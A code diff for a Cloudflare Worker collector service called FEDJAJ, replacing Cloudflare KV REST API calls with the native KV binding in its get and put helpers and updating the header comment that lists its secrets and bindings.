@@ -1,21 +1,15 @@
 /**
  * FEDJAJ — Cloudflare Worker collector (production edge).
- * Uses Cloudflare KV REST API instead of binding.
+ * Uses the NATIVE KV binding (env.KV) — no REST API, no extra credentials.
  *
- * Secrets:
- *   CF_API_TOKEN - Cloudflare API token with KV scope
- *   CF_ACCOUNT_ID - Cloudflare account ID
- *   CF_KV_NAMESPACE_ID - KV namespace ID
- *   CF_RAW_KEY - 32-byte hex encryption key
- *   TG_BOT_TOKEN - Telegram bot token
- *   TG_CHAT_ID - Telegram chat ID
+ * Bindings (all present in deployed worker settings):
+ *   KV - kv_namespace dba9293f104a4474959a909e27777046 (from wrangler.toml)
+ *   CF_RAW_KEY, TG_BOT_TOKEN, TG_CHAT_ID - secrets (persist across deploys)
  */
 
 const RATE_LIMIT = 5;
 const RATE_WINDOW_MS = 60000;
 const OTP_TTL_MS = 300000;
-
-const KV_API_BASE = `https://api.cloudflare.com/client/v4/accounts/${""}/storage/kv/namespaces/${""}/values`;
 
 function hexToBuf(hex) {
   const bytes = new Uint8Array(hex.length / 2);
@@ -30,27 +24,14 @@ function bufToBase64(buf) {
 }
 
 async function kvGet(env, key) {
-  const url = `https://api.cloudflare.com/client/v4/accounts/${env.CF_ACCOUNT_ID}/storage/kv/namespaces/${env.CF_KV_NAMESPACE_ID}/values/${encodeURIComponent(key)}`;
-  const res = await fetch(url, {
-    headers: { 'Authorization': `Bearer ${env.CF_API_TOKEN}` }
-  });
-  if (res.status === 404) return null;
-  const data = await res.json();
-  return data.result?.value || null;
+  const v = await env.KV.get(key);
+  return v === null || v === undefined ? null : v;
 }
 
 async function kvPut(env, key, value, expirationTtl) {
-  const url = `https://api.cloudflare.com/client/v4/accounts/${env.CF_ACCOUNT_ID}/storage/kv/namespaces/${env.CF_KV_NAMESPACE_ID}/values/${encodeURIComponent(key)}`;
-  const body = JSON.stringify(value);
-  const params = expirationTtl ? `?expiration_ttl=${expirationTtl}` : '';
-  await fetch(url + params, {
-    method: 'PUT',
-    headers: {
-      'Authorization': `Bearer ${env.CF_API_TOKEN}`,
-      'Content-Type': 'application/json'
-    },
-    body
-  });
+  const body = typeof value === 'string' ? value : JSON.stringify(value);
+  const opts = expirationTtl ? { expirationTtl } : {};
+  await env.KV.put(key, body, opts);
 }
 
 async function getRateKey(env, ip) {
